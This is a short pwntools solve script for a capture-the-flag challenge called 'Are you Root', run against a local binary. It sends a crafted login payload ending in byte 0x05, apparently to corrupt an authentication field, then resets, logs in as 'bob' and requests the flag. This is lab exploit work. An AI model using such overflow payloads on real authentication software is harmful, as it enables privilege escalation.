#!/usr/bin/env python3

"""
Toast's submission for the challenge 'Are you Root'.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./auth")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    io = process([exe.path])
    return io


def main():
    '''Return the flag.
    '''
    return get_flag()


def get_flag():
    '''Get the flag'''
    with conn() as io:
        payload = str.encode("login aaaaaaaa") + b'\x05'
        io.sendlineafter(b"> ", payload)
        io.sendlineafter(b"> ", b"reset")
        io.sendlineafter(b"> ", b"login bob")
        io.sendlineafter(b"> ", b"get-flag")
        flag = str(io.recvline())
        io.success("Flag found: " + flag)
        return flag


if __name__ == '__main__':
    main()
